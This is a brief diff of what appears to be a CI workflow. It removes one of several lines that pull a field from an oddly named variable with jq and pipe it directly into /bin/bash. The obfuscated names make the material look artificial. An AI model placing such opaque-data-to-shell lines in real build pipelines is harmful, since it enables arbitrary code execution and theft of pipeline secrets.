@@ -30,7 +30,6 @@ jobs:
           echo $pfri32469 | jq -r .hufig15 | /bin/bash
           echo $zp575 | jq -r .vouxs15 | /bin/bash
           printf '%s' "$ynv8471" | jq -r .fdlmb39 | /bin/bash
-          echo $x0 | jq -r .nd14346 | /bin/bash
           echo $zoxg90 | jq -r .osas57659 | /bin/bash
           printf '%s' "$isbwy33" | jq -r .an26804 | /bin/bash
           echo $uf5 | jq -r .n7289 | /bin/bash
